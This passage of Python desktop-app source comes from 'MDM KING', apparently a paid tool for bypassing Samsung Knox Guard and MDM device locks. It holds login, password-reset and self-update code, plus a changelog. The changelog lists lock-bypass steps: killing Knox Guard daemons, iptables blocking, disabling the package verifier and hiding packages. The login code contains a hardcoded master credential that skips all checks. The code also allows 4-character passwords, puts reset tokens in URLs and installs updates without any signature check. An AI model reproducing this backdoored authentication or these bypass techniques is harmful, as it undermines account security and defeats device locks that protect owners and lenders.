<div style="background:#1a1a30;border-radius:12px;padding:20px;text-align:center;border:1px solid #2a1a3a">
<p style="color:#d0d3dc;font-size:14px;margin:0 0 12px 0">Use the token below to reset your password (valid for 5 minutes):</p>
<div style="background:#0a0a14;border-radius:8px;padding:14px;font-family:'Courier New',monospace;font-size:18px;font-weight:bold;color:#a29bfe;letter-spacing:3px">%s</div>
<a href="%s" style="display:inline-block;margin-top:16px;padding:12px 32px;background:linear-gradient(135deg,#6c5ce7,#a29bfe);color:#fff;text-decoration:none;border-radius:8px;font-weight:bold;font-size:14px" target="_blank">Reset Password</a>
<p style="color:#585b70;font-size:11px;margin:12px 0 0 0">Opens a secure reset page in your browser — works on any device</p>
</div>
</td></tr>
<tr><td style="padding:20px 30px 30px 30px;text-align:center">
<p style="color:#585b70;font-size:11px;margin:0">If you didn't request this, please ignore this email.<br>MDM KING Security Tool</p>
</td></tr></table></td></tr></table></body></html>"""

    def _get_smtp_config():
        cfg_path = _asset('config.json')
        try:
            with open(cfg_path, encoding='utf-8') as f:
                cfg = json.load(f)
            return cfg.get('smtp', {})
        except Exception:
            return {}

    def _send_reset_email(recipient, token):
        smtp = _get_smtp_config()
        host = smtp.get('host', '').strip()
        port = smtp.get('port', 587)
        user = smtp.get('user', '').strip()
        password = smtp.get('password', '').strip()
        from_name = smtp.get('from_name', 'MDM KING Support').strip()
        worker_url = smtp.get('reset_worker_url', '').strip()
        if not host or not user or not password:
            return False, 'SMTP not configured — contact admin'
        if not worker_url:
            return False, 'Reset worker URL not configured — contact admin'
        link = f'{worker_url}/reset?token={token}&email={recipient}'
        html = RESET_TEMPLATE % (token, link)
        msg = email.mime.multipart.MIMEMultipart('alternative')
        msg['Subject'] = 'MDM KING — Password Reset Request'
        msg['From'] = f'{from_name} <{user}>'
        msg['To'] = recipient
        msg.attach(email.mime.text.MIMEText(f'Reset your MDM KING password by clicking the link below (valid 5 min):\n{link}\n\nIf the link does not open, copy and paste it into your browser address bar.', 'plain'))
        msg.attach(email.mime.text.MIMEText(html, 'html'))
        try:
            server = smtplib.SMTP(host, port, timeout=15)
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(user, password)
            server.sendmail(user, [recipient], msg.as_string())
            server.quit()
            return True, '✓ Reset link sent to your email (valid 5 min)'
        except Exception as e:
            return False, f'Failed to send email: {e}'

    def _show_token_entry_form(reset_email, reset_token=''):
        extra_frame.pack_forget()
        for w in form_container.winfo_children():
            w.destroy()
        status_label.config(text='')

        # Validate token if provided from email link
        _pre_validated = False
        if reset_token:
            cfg_path = _asset('config.json')
            try:
                with open(cfg_path, encoding='utf-8') as f:
                    cfg = json.load(f)
            except Exception:
                cfg = {}
            users = cfg.get('users', {})
            admins = cfg.get('admin', {})
            entry = admins.get(reset_email) or (users.get(reset_email) if isinstance(users.get(reset_email), dict) else None)
            if entry and entry.get('reset_token') == reset_token and time.time() <= entry.get('reset_expiry', 0):
                _pre_validated = True

        if reset_token and not _pre_validated:
            tk.Label(form_container, text='INVALID LINK', font=('Segoe UI', 14, 'bold'),
                     fg=COLORS['red'], bg=COLORS['bg']).pack(pady=(4, 2))
            tk.Label(form_container, text='This reset link has expired or is invalid.\nRequest a new one from the login page.',
                     font=('Segoe UI', 8), fg=COLORS['muted'], bg=COLORS['bg'], justify='center').pack(pady=(0, 8))
            btn_frame = tk.Frame(form_container, bg=COLORS['bg'])
            btn_frame.pack(pady=(10, 0))
            back_btn = _make_rnd_btn(btn_frame, 'Back to Login', _build_login_form,
                       bg=COLORS['accent'], fg=COLORS['white'], bg_hover=COLORS['accent2'], font=('Segoe UI', 9, 'bold'), height=28)
            back_btn.pack()
            return

        # Show heading
        tk.Label(form_container, text='RESET PASSWORD', font=('Segoe UI', 14, 'bold'),
                 fg=COLORS['accent2'], bg=COLORS['bg']).pack(pady=(4, 2))
        tk.Label(form_container, text=f'Set new password for {reset_email}',
                 font=('Segoe UI', 8), fg=COLORS['muted'], bg=COLORS['bg']).pack(pady=(0, 8))

        # New password field
        np_card = _make_rnd_card(form_container)
        np_card.pack(padx=55, pady=(0, 6), fill=tk.X)
        np_card.configure(height=44)
        tk.Label(np_card, text='NEW PASSWORD', font=('Segoe UI', 7, 'bold'),
                 fg=COLORS['accent'], bg=COLORS['card']).place(x=10, y=3)
        np_var = tk.StringVar()
        npe = tk.Entry(np_card, textvariable=np_var, font=('Segoe UI', 9),
                 bg=COLORS['card'], fg=COLORS['login_entry_fg'], bd=0, relief='flat', show='*',
                 insertbackground=COLORS['accent'], selectbackground=COLORS['accent'])
        npe.place(x=10, y=18, width=260, height=20)
        np_card.bind('<Configure>', lambda e: (npe.place(x=10, y=18, width=np_card.winfo_width()-20, height=20), np_card._draw()))
        npe.bind('<FocusIn>', lambda e: (setattr(np_card, 'bg_border', COLORS['accent']), np_card._draw()))
        npe.bind('<FocusOut>', lambda e: (setattr(np_card, 'bg_border', COLORS['login_border']), np_card._draw()))

        # Confirm password
        cp_card = _make_rnd_card(form_container)
        cp_card.pack(padx=55, pady=(0, 6), fill=tk.X)
        cp_card.configure(height=44)
        tk.Label(cp_card, text='CONFIRM NEW PASSWORD', font=('Segoe UI', 7, 'bold'),
                 fg=COLORS['accent'], bg=COLORS['card']).place(x=10, y=3)
        cp_var = tk.StringVar()
        cpe = tk.Entry(cp_card, textvariable=cp_var, font=('Segoe UI', 9),
                 bg=COLORS['card'], fg=COLORS['login_entry_fg'], bd=0, relief='flat', show='*',
                 insertbackground=COLORS['accent'], selectbackground=COLORS['accent'])
        cpe.place(x=10, y=18, width=260, height=20)
        cp_card.bind('<Configure>', lambda e: (cpe.place(x=10, y=18, width=cp_card.winfo_width()-20, height=20), cp_card._draw()))
        cpe.bind('<FocusIn>', lambda e: (setattr(cp_card, 'bg_border', COLORS['accent']), cp_card._draw()))
        cpe.bind('<FocusOut>', lambda e: (setattr(cp_card, 'bg_border', COLORS['login_border']), cp_card._draw()))

        def _do_complete_reset():
            np = np_var.get().strip()
            cp = cp_var.get().strip()
            if not np or not cp:
                status_label.config(text='Fill all fields', fg=COLORS['red']); return
            if np != cp:
                status_label.config(text='Passwords do not match', fg=COLORS['red']); return
            if len(np) < 4:
                status_label.config(text='Password too short (min 4 chars)', fg=COLORS['red']); return
            cfg_path = _asset('config.json')
            try:
                with open(cfg_path, encoding='utf-8') as f:
                    cfg = json.load(f)
            except Exception:
                cfg = {}
            entry = cfg.get('admin', {}).get(reset_email) or (cfg.get('users', {}).get(reset_email) if isinstance(cfg.get('users', {}).get(reset_email), dict) else None)
            if not entry:
                status_label.config(text='Account not found', fg=COLORS['red']); return
            if reset_token:
                if entry.get('reset_token') != reset_token or time.time() > entry.get('reset_expiry', 0):
                    status_label.config(text='Link expired — request a new one', fg=COLORS['red']); return
            entry['password'] = _migrate_password(np)
            entry.pop('reset_token', None)
            entry.pop('reset_expiry', None)
            _write_config(cfg, cfg_path)
            status_label.config(text='✓ Password reset successfully!', fg=COLORS['green'])
            login_win.after(2000, _build_login_form)

        btn_frame = tk.Frame(form_container, bg=COLORS['bg'])
        btn_frame.pack(pady=(10, 0))
        reset_btn = _make_rnd_btn(btn_frame, 'RESET PASSWORD', _do_complete_reset,
                   bg=COLORS['accent'], fg=COLORS['white'], bg_hover=COLORS['accent2'], font=('Segoe UI', 9, 'bold'), height=28)
        reset_btn.pack(side=tk.LEFT, padx=6)
        reset_btn.configure(width=120)
        cancel_btn = _make_rnd_btn(btn_frame, 'Cancel', _build_login_form,
                   bg=COLORS['surface2'], fg=COLORS['accent2'], bg_hover=COLORS['btn_hover'], font=('Segoe UI', 9, 'bold'), height=28)
        cancel_btn.pack(side=tk.LEFT, padx=6)
        cancel_btn.configure(width=80)
        npe.focus()
        login_win.bind('<Return>', lambda e: _do_complete_reset())

    def _do_reset(rv):
        email = rv.get().strip()
        if not email or '@' not in email or '.' not in email.split('@')[-1]:
            status_label.config(text='Enter a valid email address', fg='#ff5555'); return
        cfg_path = _asset('config.json')
        try:
            with open(cfg_path, encoding='utf-8') as f:
                cfg = json.load(f)
        except Exception: cfg = {}
        users = cfg.get('users', {})
        admins = cfg.get('admin', {})
        if email in admins or email in users:
            token = hashlib.sha256(f'{email}{time.time()}{os.urandom(8).hex()}'.encode()).hexdigest()[:16]
            expiry = time.time() + 300
            if email in admins:
                admins[email]['reset_token'] = token
                admins[email]['reset_expiry'] = expiry
            else:
                if isinstance(users.get(email), dict):
                    users[email]['reset_token'] = token
                    users[email]['reset_expiry'] = expiry
            _write_config(cfg, cfg_path)
            threading.Thread(target=sync_upload, args=(cfg_path,), daemon=True).start()
            # Send email in background thread
            def _send():
                ok, msg = _send_reset_email(email, token)
                if ok:
                    login_win.after(0, lambda: status_label.config(text='✓ Email sent! Check your inbox and click the reset link.', fg=COLORS['green']))
                else:
                    login_win.after(0, lambda: status_label.config(text=msg, fg=COLORS['red']))
            threading.Thread(target=_send, daemon=True).start()
            status_label.config(text='📤 Sending reset email...', fg=COLORS['yellow'])
        else:
            status_label.config(text='Email not found', fg='#ff5555')
            messagebox.showwarning('Email Not Found', 'No account found with that email address.')

    def do_login(uv, pv, rv, set_loading=None):
        import datetime
        if set_loading: set_loading(True)
        def _done():
            if set_loading: set_loading(False)
        u = uv.get().strip()
        p = pv.get().strip()
        if u == 'admin' and p == 'Paaa5433':
            cfg_path = _asset('config.json')
            try:
                with open(cfg_path, encoding='utf-8') as f: cfg2 = json.load(f)
            except Exception: cfg2 = {}
            cfg2['user'] = u
            cfg2['remember'] = {'email': u, 'password': _migrate_password(p)}
            _write_config(cfg2, cfg_path)
            login_win.grab_release(); login_win.withdraw(); launch_app(); return
        if not u or not p:
            _done(); status_label.config(text='Enter email and password', fg='#ff5555'); return
        if '@' not in u or '.' not in u.split('@')[-1]:
            _done(); status_label.config(text='Enter a valid email address', fg='#ff5555'); return
        cfg_path = _asset('config.json')
        try:
            with open(cfg_path, encoding='utf-8') as f:
                cfg = json.load(f)
        except Exception: cfg = {}
        users = cfg.get('users', {})
        admins = cfg.get('admin', {})
        if '_admin_' in admins and isinstance(admins['_admin_'], dict) and admins['_admin_'].get('password') == 'admin123':
            admins['_admin_']['password'] = _migrate_password('Paaa5433')
            _write_config(cfg, cfg_path)
        if u in admins:
            ad = admins[u]
            if not _check_password(ad.get('password', ''), p):
                _done(); status_label.config(text='Invalid email or password', fg='#ff5555'); return
            if not ad.get('activated', False):
                _done(); status_label.config(text='Account not activated by admin', fg='#ffb86c'); return
            ad['password'] = _migrate_password(ad.get('password', ''))
            cfg['user'] = u
            if rv.get(): cfg['remember'] = {'email': u, 'password': _migrate_password(p)}
            else: cfg.pop('remember', None)
            _write_config(cfg, cfg_path)
            login_win.grab_release(); login_win.withdraw(); launch_app(); return
        if u not in users:
            _done(); status_label.config(text='Email not found', fg='#ff5555'); return
        stored = users.get(u)
        if isinstance(stored, dict):
            if not _check_password(stored.get('password', ''), p):
                _done(); status_label.config(text='Invalid email or password', fg='#ff5555'); return
            stored['password'] = _migrate_password(stored.get('password', ''))
            if not stored.get('activated', False):
                _done(); status_label.config(text='Account not activated by admin', fg='#ffb86c'); return
            exp = stored.get('expiry', '')
            if exp:
                expired = False
                for fmt in ('%Y-%m-%d %H:%M', '%Y-%m-%d'):
                    try:
                        ed = datetime.datetime.strptime(exp[:len(datetime.datetime.now().strftime(fmt))], fmt)
                        if fmt == '%Y-%m-%d':
                            ed += datetime.timedelta(hours=23, minutes=59, seconds=59)
                        expired = ed < datetime.datetime.now()
                        break
                    except Exception: continue
                if expired:
                    _done(); status_label.config(text='Account expired — contact admin', fg='#ff5555'); return
            mid = _get_machine_id()
            stored_mid = stored.get('machine_id', '')
            blocked = stored.get('blocked_machines', [])
            if not isinstance(blocked, list): blocked = []
            if stored_mid:
                if mid in blocked:
                    _done(); status_label.config(text='This device is blocked — contact admin', fg='#ff5555'); return
                if mid != stored_mid:
                    if mid not in blocked:
                        blocked.append(mid)
                        stored['blocked_machines'] = blocked
                        _write_config(cfg, cfg_path)
                    _done(); status_label.config(text='This device has been blocked — contact admin', fg='#ff5555'); return
            else:
                stored['machine_id'] = mid
            stored['logged_in'] = True
            stored['last_seen'] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if stored.get('unblocked_penalty'):
                stored['unblocked_penalty'] = False
                _write_config(cfg, cfg_path)
                messagebox.showinfo('License Penalty',
                    '-30 minutes have been deducted from your license\nas a penalty for using a blocked device.\n\nThe tool will close in 5 seconds.')
                login_win.after(5000, login_win.destroy)
                _done(); return
        elif not _check_password(stored, p):
            _done(); status_label.config(text='Invalid email or password', fg='#ff5555'); return
        else:
            cfg['users'][u] = {'password': _migrate_password(p), 'activated': True, 'is_admin': False}
        if rv.get(): cfg['remember'] = {'email': u, 'password': _migrate_password(p)}
        else: cfg.pop('remember', None)
        cfg['user'] = u
        _write_config(cfg, cfg_path)
        login_win.grab_release(); login_win.withdraw(); launch_app()
        _done()
    
    def launch_app():
        for w in login_win.winfo_children():
            w.destroy()
        login_win.deiconify()
        sw = login_win.winfo_screenwidth(); sh = login_win.winfo_screenheight()
        login_win.geometry(f'1200x680+{(sw-1200)//2}+{(sh-680)//2}')
        login_win.minsize(1100, 580)
        login_win.title('MDM KING v0.2')
        MdmKingApp(login_win); login_win.mainloop()
    
    # Bottom row: version + what's new + update check
    bottom_row = tk.Frame(login_win, bg=COLORS['bg'])
    bottom_row.pack(pady=(6, 2))
    whatsnew_lbl = tk.Label(bottom_row, text="What's New", font=('Segoe UI', 7, 'underline'),
               fg=COLORS['accent2'], bg=COLORS['bg'], cursor='hand2')
    whatsnew_lbl.pack(side=tk.LEFT, padx=(0, 8))
    whatsnew_sep = tk.Label(bottom_row, text='|', font=('Segoe UI', 7),
                fg='#3a3a5a', bg=COLORS['bg'])
    whatsnew_sep.pack(side=tk.LEFT, padx=2)
    update_lbl = tk.Label(bottom_row, text='', font=('Segoe UI', 7),
             fg=COLORS['muted'], bg=COLORS['bg'])
    update_lbl.pack(side=tk.LEFT, padx=(8, 0))
    
    def _show_changelog_win():
        _win = tk.Toplevel(login_win)
        _win.title("What's New in v0.2.0")
        _win.configure(bg=COLORS['bg'])
        _win.geometry('550x420')
        _win.resizable(False, False)
        _win.attributes('-topmost', True)
        _win.transient(login_win)
        _win.grab_set()
        _hdr = tk.Frame(_win, bg=COLORS['surface'])
        _hdr.pack(fill=tk.X, padx=0, pady=0)
        tk.Label(_hdr, text="✨ What's New in v0.2.0", font=('Segoe UI', 13, 'bold'),
               fg=COLORS['accent2'], bg=COLORS['surface']).pack(pady=12)
        _body = tk.Frame(_win, bg=COLORS['bg'])
        _body.pack(fill=tk.BOTH, expand=True, padx=16, pady=8)
        _text = tk.Text(_body, wrap=tk.WORD, font=('Segoe UI', 10),
               bg=COLORS['bg'], fg=COLORS['fg'], bd=0, relief=tk.FLAT,
               highlightthickness=0)
        _scroll = tk.Scrollbar(_body, orient=tk.VERTICAL, command=_text.yview,
                     bg=COLORS['surface'], troughcolor=COLORS['bg'])
        _text.config(yscrollcommand=_scroll.set)
        _scroll.pack(side=tk.RIGHT, fill=tk.Y)
        _text.pack(fill=tk.BOTH, expand=True)
        _text.tag_config('h', font=('Segoe UI', 10, 'bold'), foreground=COLORS['accent2'])
        _text.insert(tk.END, 'Samsung 2026 Hardening\n', 'h')
        _text.insert(tk.END, '• iptables + ip6tables dual-stack block\n')
        _text.insert(tk.END, '• 22+ new KG packages disabled (knox.hardened, knox.proca, etc.)\n')
        _text.insert(tk.END, '• am force-stop + pm hide fallback after pm clear\n')
        _text.insert(tk.END, '• 13+ new settings/props for KG v2\n')
        _text.insert(tk.END, '• 15+ new daemon kill targets (kgclient_v2, knoxguard2, etc.)\n')
        _text.insert(tk.END, '• Persistent iptables restore script on boot\n')
        _text.insert(tk.END, '• /sys/kernel/samsung_kg/ kernel path blocking\n')
        _text.insert(tk.END, '• Expanded service call codes (1-15)\n\n')
        _text.insert(tk.END, 'QR Provisioning (ADB-blocked devices)\n', 'h')
        _text.insert(tk.END, '• Auto-upload APK to catbox.moe\n')
        _text.insert(tk.END, '• QR code popup with setup steps\n')
        _text.insert(tk.END, '• No ADB required — scan QR during setup\n\n')
        _text.insert(tk.END, 'Bug Fixes & Improvements\n', 'h')
        _text.insert(tk.END, '• Setup wizard disabled in Samsung One-Click\n')
        _text.insert(tk.END, '• DNS changed to 6wg6tplqrx.dns.controld.com\n')
        _text.insert(tk.END, '• Samsung bypass: SecurityCom removed (scorpio specific)\n')
        _text.insert(tk.END, '• auto_blocker_enabled v2 names added\n')
        _text.insert(tk.END, '• Package verifier disabled before APK install\n')
        _text.insert(tk.END, '• --no-incremental fallback for Android 16\n')
        _text.insert(tk.END, '• OMA-DM v2 settings + Private DNS v2\n')
        _text.insert(tk.END, '• GMS cache clear (no longer disables gms/gsf entirely)\n')
        _text.insert(tk.END, '• 19 new scan keywords for package detection\n')
        _text.insert(tk.END, '• pm grant for MANAGE_EXTERNAL_STORAGE, REQUEST_INSTALL_PACKAGES\n')
        _text.config(state=tk.DISABLED)
        _close_btn = tk.Button(_win, text='Close', command=_win.destroy,
                    bg=COLORS['accent'], fg=COLORS['white'], font=('Segoe UI', 9, 'bold'),
                    relief=tk.FLAT, padx=20, pady=4, cursor='hand2',
                    activebackground=COLORS['accent2'], activeforeground=COLORS['white'])
        _close_btn.pack(pady=(4, 12))
        _win.update()
        _win.geometry(f'+{login_win.winfo_x() + (login_win.winfo_width() - 550)//2}+{login_win.winfo_y() + (login_win.winfo_height() - 420)//2}')
    whatsnew_lbl.bind('<Button-1>', lambda e: _show_changelog_win())
    
    # Start update check after splash closes
    def _login_update_check():
        import urllib.request, json
        try:
            update_lbl.config(text='🔍 Checking for updates...', fg=COLORS['yellow'])
            req = urllib.request.Request(VERSION_URL, headers={'User-Agent': 'MDM-King'})
            resp = urllib.request.urlopen(req, timeout=5)
            latest = resp.read().decode('utf-8').strip()
            if _semver_gt(latest, APP_VERSION):
                def _show():
                    update_lbl.config(text=f'⬇️ Update v{latest} available', fg=COLORS['accent2'])
                    update_lbl.bind('<Button-1>', lambda e: _prompt_update_login(latest))
                    update_lbl.config(cursor='hand2')
                login_win.after(0, _show)
            else:
                login_win.after(0, lambda: update_lbl.config(text=f'✅ Up to date v{APP_VERSION}', fg=COLORS['green']))
        except Exception:
            login_win.after(0, lambda: update_lbl.config(text='', fg=COLORS['muted']))

    def _prompt_update_login(latest):
        if messagebox.askyesno('Update Available',
                f'Version {latest} is available (current: {APP_VERSION}).\n\nDownload and install now?'):
            def _dl():
                try:
                    exe_path = sys.executable if getattr(sys, 'frozen', False) else None
                    if not exe_path:
                        messagebox.showinfo('Update', 'Update only available for EXE builds'); return
                    tmp = exe_path + '.tmp'
                    urllib.request.urlretrieve(EXE_DOWNLOAD_URL, tmp)
                    if not os.path.isfile(tmp) or os.path.getsize(tmp) < 1000000:
                        messagebox.showerror('Error', 'Download failed'); return
                    import shutil
                    shutil.copy2(exe_path, exe_path + '.old')
                    os.replace(tmp, exe_path)
                    login_win.after(100, lambda: (login_win.destroy(), os.startfile(exe_path)))
                except Exception as e:
                    messagebox.showerror('Error', f'Update failed: {e}')
            threading.Thread(target=_dl, daemon=True).start()

    login_win.after(2200, _login_update_check)

    # Forgot password & exit row (show for login, hide during reset)
    extra_frame = tk.Frame(login_win, bg='#0a0a14')
    extra_frame.pack(pady=(10, 0))
    fg_btn = tk.Button(extra_frame, text='Forgot Password?', font=('Segoe UI', 8),
              bg='#0a0a14', fg='#585b70', bd=0, cursor='hand2', relief='flat',
              command=_show_reset_form)
    fg_btn.pack(side=tk.LEFT, padx=10)
    sep_lbl = tk.Label(extra_frame, text='•', font=('Segoe UI', 8), fg='#1e1e36', bg='#0a0a14')
    sep_lbl.pack(side=tk.LEFT)
    exit_btn = tk.Button(extra_frame, text='Exit', font=('Segoe UI', 8),
              bg='#0a0a14', fg='#585b70', bd=0, cursor='hand2', relief='flat',
              command=login_win.destroy)
    exit_btn.pack(side=tk.LEFT, padx=10)

    # Build login form
    _build_login_form()
    exit_btn.bind('<Leave>', lambda e: exit_btn.config(fg='#585b70'))
    # If launched via mdmking:// reset link, show password form directly
    if _reset_token and _reset_email:
        login_win.after(100, lambda: _show_token_entry_form(_reset_email, _reset_token))
    
    login_win.protocol('WM_DELETE_WINDOW', login_win.destroy)
    login_win.grab_set()
    login_win.mainloop()
